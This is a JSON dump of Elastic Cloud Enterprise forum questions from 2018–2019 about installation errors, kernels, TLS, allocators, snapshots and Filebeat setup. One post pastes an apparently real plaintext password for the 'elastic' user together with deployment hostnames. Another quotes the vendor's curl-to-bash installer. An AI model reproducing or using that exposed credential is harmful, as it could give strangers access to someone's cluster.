    "url": "https://discuss.elastic.co/t/install-ece-version-2-0-1-on-current-kernel-lt-is-4-4-169-1-el7-elrepo-x86-64-does-not-work/162699",
    "title": "Install ECE Version:2.0.1 on Current Kernel-LT is 4.4.169-1.el7.elrepo.x86_64 does not work",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Giovanni_Mazza",
    "date": "January 2, 2019, 6:22pm January 16, 2019, 6:22pm",
    "body": "I have been trying to install ECE 2.0.1 on top of Kernel-LT version .4.169-1.el7.elrepo.x86_64 with no success. I think this is related to the notice on the limitation page Kernel-LT has a regression on 4.4.156. From the archive repository, install 4.4.155. Well i am trying to find this kernel 4.4.155-1.el7.elrepo.x86_64 I cannot find where is this archive yum repo channel on elrepo Please advice how to get the 4.4.155 kernel and how to downgrade the current kernel i had installed following the instructions for CentOS 7 using Yum",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "1d5808a0-90c6-448c-bd26-27201f97369b",
    "url": "https://discuss.elastic.co/t/cannot-install-error-checking-file-system-storage-driver-permissions/162181",
    "title": "Cannot install error checking file system storage driver permissions",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Giovanni_Mazza",
    "date": "December 26, 2018, 10:44pm December 27, 2018, 9:10pm December 28, 2018, 4:16pm January 11, 2019, 4:16pm",
    "body": "Getting this error i followed the instructions as close as i could the only thing that is different is that the Storage is /Data/elastic instead of the default I got this warning Checking Docker file system... PASSED The installation with extfs can proceed; however, we recommend XFS And then I got this error: Checking OS file system storage driver permissions... FAILED Filesystem permissions issue with storage driver detected, please check that you are using the proper Kernel version. Errors have caused Elastic Cloud Enterprise installation to fail Some of the prerequisites failed: [OS file system storage driver permissions], please fix before continuing I am installing with a user member of docker group. I had made the storage location /Data allowing to all member of the group docker. I try not use sudo as instructed the user should work as member of docker group. Please help",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fc5d9d7a-a185-439e-8c11-41f1bbfe1343",
    "url": "https://discuss.elastic.co/t/fips-140-2/160624",
    "title": "FIPS 140-2",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "alexus",
    "date": "December 12, 2018, 9:10pm December 13, 2018, 4:04pm December 19, 2018, 5:38pm January 2, 2019, 5:38pm",
    "body": "Assuming Elastic Stack 6.4.0+ is running within ECE, can it be configured for FIPS 140-2? Configuring Elasticsearch in a FIPS 140-2 Environment | Elastic FIPS 140-2 | Elasticsearch Reference [6.5] | Elastic Please advise.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fca83627-ed05-4f01-a263-644e7ca157c2",
    "url": "https://discuss.elastic.co/t/trial-licence-limitations/160440",
    "title": "Trial Licence Limitations",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "alexus",
    "date": "December 11, 2018, 9:29pm December 11, 2018, 10:39pm December 25, 2018, 10:39pm",
    "body": "Hello, I'm trying out ECE and running into some questions: Does Trial License limits me in some ways (other then 30 days), like limit amount of cluster I can deploy or kind of cluster I want to deploy and etc. I looked over at following and did not find anything: Manage Licenses | Elastic Cloud Enterprise Reference [2.0] | Elastic Limitations and Known Problems | Elastic Cloud Enterprise Reference [2.0] | Elastic Please advise.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e0c1c60e-5467-425b-b701-97cfd27e18b1",
    "url": "https://discuss.elastic.co/t/using-gsuite-for-saml-integration-with-elastic-stack-elasticsearch-kibana/159971",
    "title": "Using GSuite for SAML integration with Elastic Stack (ElasticSearch + Kibana)",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "December 7, 2018, 7:10pm December 7, 2018, 6:57pm December 8, 2018, 9:36am December 21, 2018, 7:28pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f521ee18-ecd4-4619-b2c4-76b3c656e054",
    "url": "https://discuss.elastic.co/t/elastic-cloud-enterprise-administration-i-on-demand-training-course-is-badly-out-of-date/159982",
    "title": "“Elastic Cloud Enterprise Administration I” on-demand training course is badly out-of-date",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "dlwillson",
    "date": "December 7, 2018, 10:19pm December 7, 2018, 10:50pm December 7, 2018, 10:51pm December 21, 2018, 10:51pm",
    "body": "I wanted to let you know that the on-demand course “Elastic Cloud Enterprise Administration I” is badly out-of-date. Following the lab setup instructions always yields an ECE 2 cluster, but all the videos, labs, text, and screenshots are for ECE 1. Bridging the differences is difficult and pointlessly distracting. I am an experienced trainer, materials developer, and DevOps Engineer; I’d be happy to help you develop and test an updated version.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a549bad3-8d7c-495a-8722-cfbb4b67da08",
    "url": "https://discuss.elastic.co/t/is-there-a-way-to-record-ece-passwords-and-tokens-more-easily/159649",
    "title": "Is there a way to record ECE Passwords and Tokens more easily?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "December 6, 2018, 4:06am December 6, 2018, 1:58pm December 20, 2018, 1:55pm",
    "body": "When ECE completes installation, the screen will display passwords for admin, read-only users and for allocator, roles and emergency tokens. These passwords are long and complex. Does ECE store these passwords anywhere or could the passwords be piped to a text file for easier retrieval?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "fd0aa3e7-f22c-47fc-8a3c-3bf836ab18f1",
    "url": "https://discuss.elastic.co/t/ldap-ad-auth-for-ece/158498",
    "title": "LDAP/AD auth for ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "November 28, 2018, 8:21am November 28, 2018, 8:45am November 28, 2018, 8:55am November 28, 2018, 9:11am November 28, 2018, 9:15am November 28, 2018, 10:00am November 28, 2018, 10:06am November 28, 2018, 1:52pm November 29, 2018, 6:37am November 29, 2018, 6:56am November 29, 2018, 6:57am December 5, 2018, 8:08am December 5, 2018, 10:34am December 5, 2018, 12:37pm December 19, 2018, 12:37pm",
    "body": "",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "5c2bd0b1-da96-463a-abcc-8d7bb9b4ff15",
    "url": "https://discuss.elastic.co/t/ece-2-0-1-unable-to-upload-letsencrypt-tls-certificate/158802",
    "title": "ECE 2.0.1 Unable to upload Letsencrypt TLS certificate",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "cmoi",
    "date": "November 29, 2018, 5:28pm November 29, 2018, 6:40pm November 29, 2018, 7:59pm November 29, 2018, 8:18pm November 29, 2018, 10:04pm November 30, 2018, 2:59pm December 14, 2018, 2:59pm",
    "body": "Hi, I am unable to install a certificate signed by Letsencrypt as a TLS certificate neither for Proxy or Cloud UI and get this error: Certificate chain was invalid [Path does not chain with any of the trust anchors] Could it be because the docker images use an OpenJDK version that does not include the root certificate needed to trust letsencrypt certificate ? I thought it could be a similar issue, but with letsencrypt certificates, to this one : https://github.com/elastic/elasticsearch-docker/issues/171 Is it possible to add support to letsencrypt certificate on ECE 2 ? Thanks for your help.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b331b193-5582-4c17-9e40-afb2843e1476",
    "url": "https://discuss.elastic.co/t/ece-installation-failing-timeout/158028",
    "title": "ECE Installation failing, Timeout",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "phimob",
    "date": "November 23, 2018, 2:54pm November 23, 2018, 2:54pm November 26, 2018, 3:00pm November 26, 2018, 6:05pm November 27, 2018, 12:07pm November 27, 2018, 2:04pm November 28, 2018, 11:42am December 12, 2018, 11:43am",
    "body": "Hi, I'm trying to install ECE on CentOs 7 but it's timing out at \"Applying Admin Console Elasticsearch index templates {}\" I can't make much sense of the log file it's telling me to look at. Any help would be appreciated. I'm running this command: bash <(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install This it the output: -- Verifying Prerequisites -- Checking runner container does not exist... PASSED Checking host storage root volume path is not root... PASSED Checking host storage path is accessible... PASSED Checking host storage path contents matches whitelist... PASSED Checking Docker version... PASSED Checking Docker file system... PASSED Checking Docker storage driver... PASSED Checking runner ip connectivity... PASSED Checking OS IPv4 IP forward setting... PASSED Checking OS max map count setting... PASSED Checking OS kernel version... PASSED Checking minimum required memory... PASSED Checking OS kernel cgroup.memory... PASSED Checking OS minimum ephemeral port... PASSED Checking OS max open file descriptors per process... PASSED Checking OS max open file descriptors system-wide... PASSED Checking OS file system and Docker storage driver compatibility... PASSED -- Completed Verifying Prerequisites -- Running Bootstrap container Monitoring bootstrap process Loaded bootstrap settings {} Initialising feature flag [DedicatedNodeTypes] to [true] {} Starting local runner {} Started local runner {} Waiting for runner container node {} Runner container node detected {} Waiting for coordinator candidate {} Detected coordinator candidate {} Detected pending coordinator, promoting coordinator {} Coordinator accepted {} Storing current platform version: 2.0.0 {} Storing Instance Types: [elasticsearch,kibana] {} Storing Elastic Stack versions: [5.6.12,6.4.1] {} Creating Admin Console Elasticsearch backend {} Applying Admin Console Elasticsearch index templates {} Unhandled error. {} -- An error has occurred in bootstrap process. Please examine logs -- java.util.concurrent.TimeoutException: Futures timed out after [600000 milliseconds] at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala:223) at scala.concurrent.impl.Promise$DefaultPromise.result(Promise.scala:227) at scala.concurrent.Await$$anonfun$result$1.apply(package.scala:190) at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala:53) at scala.concurrent.Await$.result(package.scala:190) at no.found.bootstrap.BootstrapInitial.bootstrapServiceLayer(BootstrapInitial.scala:963) at no.found.bootstrap.BootstrapInitial.bootstrap(BootstrapInitial.scala:678) at no.found.bootstrap.BootstrapInitial$.delayedEndpoint$no$found$bootstrap$BootstrapInitial$1(BootstrapInitial.scala:1311) at no.found.bootstrap.BootstrapInitial$delayedInit$body.apply(BootstrapInitial.scala:1305) at scala.Function0$class.apply$mcV$sp(Function0.scala:34) at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.App$$anonfun$main$1.apply(App.scala:76) at scala.collection.immutable.List.foreach(List.scala:392) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:35) at scala.App$class.main(App.scala:76) at no.found.bootstrap.BootstrapInitial$.main(BootstrapInitial.scala:1305) at no.found.bootstrap.BootstrapInitial.main(BootstrapInitial.scala) Errors have caused Elastic Cloud Enterprise installation to fail - Please check logs Node type - initial",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "159cfafb-f94e-4404-a467-68b086e99719",
    "url": "https://discuss.elastic.co/t/2-0-1-released/158414",
    "title": "2.0.1 released",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "joegallo",
    "date": "November 27, 2018, 8:33pm November 27, 2018, 8:33pm December 11, 2018, 8:34pm",
    "body": "We are pleased to announce that ECE 2.0.1 has been released today. This is a bug fix release. Release notes: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-release-notes-2.0.1.html",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "43551e1f-5d57-4317-ab83-6e14f51668b8",
    "url": "https://discuss.elastic.co/t/question-on-nodes-in-an-ece-cluster/158060",
    "title": "Question on Nodes in an ECE Cluster",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Ong",
    "date": "November 24, 2018, 6:58am November 26, 2018, 2:54pm December 10, 2018, 2:54pm",
    "body": "I have an ECE setup with 2 availability zones. On the create console page, there does not seem to be an option for setting the number of nodes and the node information e.g. (Name of node, type of node). How are nodes created and configured in the ECE UI console? For ECE, does each node have to correspond to 1 VM/physical server? Or can the allocator machine contain multiple nodes ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a9c80bbe-b880-4cfd-9a42-7e4e8268f61e",
    "url": "https://discuss.elastic.co/t/failed-attempts-to-create-a-deployment/155039",
    "title": "Failed attempts to create a deployment",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "wpitt13",
    "date": "November 1, 2018, 3:12pm November 1, 2018, 3:35pm November 1, 2018, 4:22pm November 1, 2018, 4:35pm November 1, 2018, 4:55pm November 15, 2018, 5:06pm",
    "body": "ECE 2.0.0 Failed attempts to create a deployment result in a failed cluster showing in the list of deployments that cannot be removed. The deployment shows the following status: Deployment health issues: Some instances in the deployment are unhealthy The latest attempt to change the configuration failed When looking at the ECE Cloud UI, the node appears under the allocator with a Red X and the version is showing 'v'. However, when logging into the OS on the allocator the node is not showing in the list of docker containers.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ff3436da-39e3-4ce0-b112-040296fdad22",
    "url": "https://discuss.elastic.co/t/allocator-information/152872",
    "title": "Allocator information",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "phr0gz",
    "date": "October 17, 2018, 3:42pm October 17, 2018, 4:37pm October 18, 2018, 10:24am October 18, 2018, 8:56pm October 22, 2018, 12:49pm November 5, 2018, 12:49pm",
    "body": "Hello, we are currently using a simple hardware architecture: 1:VM = 1:Node and my company is looking about the best subscription program. And of course ECE is on the table. I've few questions despite the available documentation: On each of our VM Is it possible to install a docker container and move the ES node inside (whatever if ES is installed from scratch or not). Because the documentation the allocator memory size is recommended between 128-256 GB, so I guess it is designed to host multiple ES nodes. But the idea here is to migrate without change the VM and with a 1:1 ratio (1 VM = 1 Container = 1 Node). If not does it mean we will need dedicated bare-metal servers? Our current infra is not very small (approx 200 vcpu, 700 GB Ram, > 50TB disk) so it will represent a lot of changes...and Finally I'm not sure it will be suitable for companies that are already using dedicated load-balancers, Virtualisation farms, and SAN equipment...",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "6721b2f4-e05c-49ce-88d5-8f2a25e48cc5",
    "url": "https://discuss.elastic.co/t/elastic-cloud-with-logstash-http-input/152082",
    "title": "Elastic Cloud with Logstash HTTP Input",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "rcoundon",
    "date": "October 11, 2018, 3:25pm October 18, 2018, 9:02pm November 1, 2018, 9:02pm",
    "body": "I would like to be able to send data to the Logstash pipeline using an HTML input plugin, running within Elastic Cloud. However, having set up a simple pipeline I get no response if I try to POST to it. I assume this is because the port defined in the input plugin isn't available to the outside world. How should I go about making this work? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9f42c421-df44-4090-a350-07f8ed29b236",
    "url": "https://discuss.elastic.co/t/ece-deployment-cannot-connect-filebeats-to-kibana/152575",
    "title": "ECE deployment cannot connect filebeats to kibana",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JeanD-SYD",
    "date": "October 16, 2018, 5:08am October 16, 2018, 1:36am October 16, 2018, 1:36am October 16, 2018, 1:36am October 16, 2018, 2:34pm October 16, 2018, 2:50pm October 17, 2018, 12:13am October 31, 2018, 12:13am",
    "body": "Hi, I have deployment the on-premise ECE, following the guide. Just a simple POC, but it seems the the licence will expire before I can get some real data in the system. Best to then stick with Splunk 3 server ece-3a-01.ece-elastic.xyz ece-3b-01.ece-elastic.xyz ece-3c-01.ece-elastic.xyz I have a wildcard DNS and Wildcard SSL certificate *.ece-elastic.xyz I have deploy a single deployment kibana, no customization. I have not modified or changed the default kibana deployment as deploy from ECE. I installed 2 ubuntu 16.04 beats servers and installed filebeat-6.4.2-amd64.deb I modified the filebeat.yml, but the setting seem a bit of a mystery and not well documented for this configuration. I was told not to use the cloud.id: or cloud.auth as this is for the cloud version Here are my setting I have tried various combinations, but does any know what is should be pointed to. eg Elasticsearch https://261f41b5d7114d2fb96c403bed80c148.ece-elastic.xyz:9243/ kibana https://2f2122e03fe0499db11412a9e0b69b4a.ece-elastic.xyz:9243/ #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: Array of hosts to connect to. #hosts: [\"localhost:9200\"] hosts: [\"ece-3a-01.ece-elastic.xyz:9343\"] protocol: \"https\" username: \"elastic\" password: \"3VC933BDccAl8Q90iZo0yJg9\"",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "dfd43a39-c8f8-48a9-9b9a-284324da614f",
    "url": "https://discuss.elastic.co/t/update-s3-snapshots-base-path-for-a-cluster-in-ece-v1-1/151934",
    "title": "Update s3 snapshots base_path for a cluster in ECE (v1.1)",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Simon_Khan",
    "date": "October 10, 2018, 8:25pm December 5, 2018, 5:00pm October 15, 2018, 12:57am October 29, 2018, 12:57am",
    "body": "From what I understand, ECE automates creating snapshots by creating a found-snapshots repository which stores the snapshots of all the clusters in a folder described by their cluster id. And so for Cluster A, its settings would look like GET <cluster A endpoint>/_snapshot/found_snapshots { \"type\": \"s3\", \"settings\": { \"bucket\": \"<s3_bucket_name>\", \"client\": \"mys3client\", \"secret_key\": \"<s3_secret_key>\", \"base_path\": \"snapshots/<Cluster A ID>\", \"access_key\": \"<s3_access_key>\", } } Is there any way we can update the base_path for cluster A to store snapshots in a folder with a different name instead of its id? Issuing a PUT command with an updated base path seems to work until the snapshots are fired at its 30 minute interval which causes the base_path to revert back to the cluster id. Is there a better way to change the base path of a cluster's snapshot location permanently so it is not referred by its cluster id?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "77042660-57f1-4f0f-93c1-7afd242f2c38",
    "url": "https://discuss.elastic.co/t/azure-market-place-install-fails-with-gpg-error/152101",
    "title": "Azure Market Place install fails with GPG error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Erik_Peterson",
    "date": "October 11, 2018, 5:09pm October 12, 2018, 9:00am October 26, 2018, 9:13am",
    "body": "When deploying the Data nodes the script errors with the following error message: It appears there is a untrusted GPG key that is blocking the install Full error stack from data-1/script (Azure Marketplace ARM install) { \"status\": \"Failed\", \"error\": { \"code\": \"ResourceDeploymentFailure\", \"message\": \"The resource operation completed with terminal provisioning state 'Failed'.\", \"details\": [ { \"code\": \"VMExtensionProvisioningError\", \"message\": \"VM has reported a failure when processing extension 'script'. Error message: \"Enable failed: failed to execute command: command terminated with exit status=10\\n[stdout]\\n\\n[11102018-17:01:30] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 20/60\\n[11102018-17:01:36] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 21/60\\n[11102018-17:01:41] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 22/60\\n[11102018-17:01:46] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 23/60\\n[11102018-17:01:51] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 24/60\\n[11102018-17:01:57] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 25/60\\n[11102018-17:02:02] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 26/60\\n[11102018-17:02:07] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 27/60\\n[11102018-17:02:12] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 28/60\\n[11102018-17:02:18] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 29/60\\n[11102018-17:02:23] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 30/60\\n[11102018-17:02:28] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 31/60\\n[11102018-17:02:33] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 32/60\\n[11102018-17:02:38] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 33/60\\n[11102018-17:02:44] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 34/60\\n[11102018-17:02:49] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 35/60\\n[11102018-17:02:54] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 36/60\\n[11102018-17:02:59] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 37/60\\n[11102018-17:03:05] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 38/60\\n[11102018-17:03:10] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 39/60\\n[11102018-17:03:15] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 40/60\\n[11102018-17:03:20] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 41/60\\n[11102018-17:03:25] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 42/60\\n[11102018-17:03:31] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 43/60\\n[11102018-17:03:36] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 44/60\\n[11102018-17:03:41] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 45/60\\n[11102018-17:03:46] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 46/60\\n[11102018-17:03:52] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 47/60\\n[11102018-17:03:57] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 48/60\\n[11102018-17:04:02] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 49/60\\n[11102018-17:04:07] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 50/60\\n[11102018-17:04:12] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 51/60\\n[11102018-17:04:18] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 52/60\\n[11102018-17:04:23] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 53/60\\n[11102018-17:04:28] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 54/60\\n[11102018-17:04:33] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 55/60\\n[11102018-17:04:39] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 56/60\\n[11102018-17:04:44] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 57/60\\n[11102018-17:04:49] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 58/60\\n[11102018-17:04:54] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 59/60\\n[11102018-17:05:00] [wait_for_started] seeing if node is up after sleeping 5 seconds, retry 60/60\\n[11102018-17:05:00] [wait_for_started] never saw elasticsearch go up locally\\n\\n[stderr]\\nmke2fs 1.42.13 (17-May-2015)\\ngpg: keyring /tmp/tmp6jt3ojw8/secring.gpg' created\\ngpg: keyring/tmp/tmp6jt3ojw8/pubring.gpg' created\\ngpg: requesting key EEA14886 from hkp server keyserver.ubuntu.com\\ngpg: /tmp/tmp6jt3ojw8/trustdb.gpg: trustdb created\\ngpg: key EEA14886: public key \"Launchpad VLC\" imported\\ngpg: no ultimately trusted keys found\\ngpg: Total number processed: 1\\ngpg: imported: 1 (RSA: 1)\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nsent invalidate(passwd) request, exiting\\nsent invalidate(group) request, exiting\\nSynchronizing state of elasticsearch.service with SysV init with /lib/systemd/systemd-sysv-install...\\nExecuting /lib/systemd/systemd-sysv-install enable elasticsearch\\nCreated symlink from /etc/systemd/system/multi-user.target.wants/elasticsearch.service to /usr/lib/systemd/system/elasticsearch.service.\\nrun-parts: executing /usr/share/netfilter-persistent/plugins.d/15-ip4tables save\\nrun-parts: executing /usr/share/netfilter-persistent/plugins.d/25-ip6tables save\\n\".\" } ] } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "15b93a4d-7610-42b0-a3f0-834bd598d904",
    "url": "https://discuss.elastic.co/t/ese-allocators-xfs-not-showing-allocated-space/151962",
    "title": "ESE allocators xfs not showing allocated space",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JeanD-SYD",
    "date": "October 11, 2018, 3:31am October 11, 2018, 6:41am October 11, 2018, 7:17am October 11, 2018, 8:01am October 12, 2018, 4:12am October 26, 2018, 4:12am",
    "body": "Hi, I have setup 3 allocators using the small script on Ubuntu 16.04. https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example1.html The servers have each a root drive of 80GB and an extra drive of 1TB The 3 allocators are only showing 32.48 GB available of 53.48 GB, should be about 1TB This is just a pilot setup but would like to get the full amount assigned I have followed a few thread but no luck /dev/vda1 84G 1.9G 82G 3% / /dev/vdb 1.1T 5.9G 1.1T 1% /mnt/data ece-3a-01 (MY_ZONE-1) ece-3b-01 (MY_ZONE-2) ece-3c-01 (MY_ZONE-3) ubuntu@ece-3a-01:/mnt$ tree -L 3 . └── data ├── docker │ ├── aufs │ ├── containers │ ├── image │ ├── network │ ├── plugins │ ├── swarm │ ├── tmp │ ├── trust │ └── volumes └── elastic ├── 10.243.196.19 ├── bootstrap-state └── logs ubuntu@ese-3b-01:~$ df -H Filesystem Size Used Avail Use% Mounted on udev 34G 0 34G 0% /dev tmpfs 6.8G 11M 6.8G 1% /run /dev/vda1 84G 1.9G 82G 3% / tmpfs 34G 5.8M 34G 1% /dev/shm tmpfs 5.3M 0 5.3M 0% /run/lock tmpfs 34G 0 34G 0% /sys/fs/cgroup /dev/vdb 1.1T 5.9G 1.1T 1% /mnt/data tmpfs 6.8G 0 6.8G 0% /run/user/1000 sudo docker info | grep Root Root Dir: /mnt/data/docker/aufs Docker Root Dir: /mnt/data/docker WARNING: No swap limit support ubuntu@ese-3b-01:~$ docker info Containers: 20 Running: 20 Paused: 0 Stopped: 0 Images: 5 Server Version: 17.03.2-ce Storage Driver: aufs Root Dir: /mnt/data/docker/aufs Backing Filesystem: xfs Dirs: 61 Dirperm1 Supported: true Logging Driver: json-file Cgroup Driver: cgroupfs Plugins: Volume: local Network: bridge host macvlan null overlay Swarm: inactive Runtimes: runc Default Runtime: runc Init Binary: docker-init containerd version: 4ab9917febca54791c5f071a9d1f404867857fcc runc version: 54296cf40ad8143b62dbcaa1d90e520a2136ddfe init version: N/A (expected: 949e6facb77383876aeff8a6944dde66b3089574) Security Options: apparmor seccomp Profile: default Kernel Version: 4.4.0-137-generic Operating System: Ubuntu 16.04.5 LTS OSType: linux Architecture: x86_64 CPUs: 8 Total Memory: 62.92 GiB Name: ese-3b-01 ID: QUQI:2MEV:W7B2:27YK:MPXP:MQJ3:42QS:NUM4:ZJHK:TMX5:E42T:GZ7U Docker Root Dir: /mnt/data/docker Debug Mode (client): false Debug Mode (server): false Registry: https://index.docker.io/v1/ Experimental: false Insecure Registries: 127.0.0.0/8 Live Restore Enabled: false WARNING: No swap limit support",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "57f9c551-4794-4f9f-a808-950a5f187d5c",
    "url": "https://discuss.elastic.co/t/forward-logs-from-logging-and-metrics-cluster-to-external-log-system/151531",
    "title": "Forward logs from logging-and-metrics cluster to external log system",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gautu7",
    "date": "October 9, 2018, 5:50am October 9, 2018, 9:07am October 9, 2018, 1:05pm October 9, 2018, 4:02pm October 9, 2018, 5:12pm October 10, 2018, 9:40am October 10, 2018, 2:39pm October 11, 2018, 7:59am October 11, 2018, 2:23pm October 25, 2018, 2:28pm",
    "body": "In our ECE environment, the logs are being indexed into a logging-and-metrics cluster. How does this work behind the scenes? Is there a Filebeat which is collecting the logs from the Elasticsearch cluster and forwarding them to the logging cluster? We want to forward these logs from the logging cluster to an external log system, how do we forward logs directly from this cluster without having to introduce an intermediate layer(for example-an app which queries indices and forwards)? Can we have a local File beat to read the logs from the path specified below and forward to an outbound url instead of Logstash? I also came across an API to read log files https://www.elastic.co/guide/en/cloud-enterprise/current/generate-es-cluster-logs.html Here is the data from the indices in the cluster \"hits\": [ { \"_index\": \"cluster-logs-2018.10.08\", \"_type\": \"doc\", \"_id\": <ID>, \"_score\": 1, \"_source\": { \"@timestamp\": \"2018-10-08T00:00:11.183Z\", \"beat\": { \"hostname\": <hostname>, \"name\": <name>, \"version\": \"5.6.8-xexec\" }, \"ece\": { \"component\": \"elasticsearch\", \"runner\": <IP>, \"zone\": <ZONE> }, \"ece.cluster\": <cluster_id>, \"ece.instance\": \"instance-0000000002\", \"input_type\": \"log\", \"message\": \"[2018-10-08T00:00:06,295][WARN ][org.elasticsearch.deprecation.rest.RestController] Content type detection for rest requests is deprecated. Specify the content type using the [Content-Type] header.\", \"offset\": 198, \"source\": \"/logs/allocator/containers/elasticsearch/<cluster_id>/instance-0000000002/logs/es.log\", \"type\": \"log\" } },",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "b71a3879-7cee-4b7f-83de-f3947548d027",
    "url": "https://discuss.elastic.co/t/remote-snapshot-plugin-on-clusters-running-on-cloud-elastic-co/151156",
    "title": "Remote snapshot plugin on clusters running on cloud.elastic.co",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "marcelopm",
    "date": "October 5, 2018, 6:02am October 5, 2018, 6:11am October 8, 2018, 6:11am October 22, 2018, 6:25am",
    "body": "How to install remote snapshot plugin (like repository-s3) on clusters running on cloud.elastic.co? I have a cluster running 6.3 with a index with buggy data. I've managed to fix the data and reindex it into a new local index. I've created a new cluster running 6.4 and tried to use reindex remote but it fails for different reasons (scroll errors, I've already changed the size, doesn't work). My hope is that if I can take a snapshot of my new index (with the fixed data) running on the cluster with 6.3 and restore it in the new cluster with 6.4 it might work. Any clues? Cheers.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5e1e3b2f-a9fe-412c-a70b-fc5fabb43fda",
    "url": "https://discuss.elastic.co/t/creating-cluster-with-the-api/151063",
    "title": "Creating cluster with the API",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JamesNotJamez",
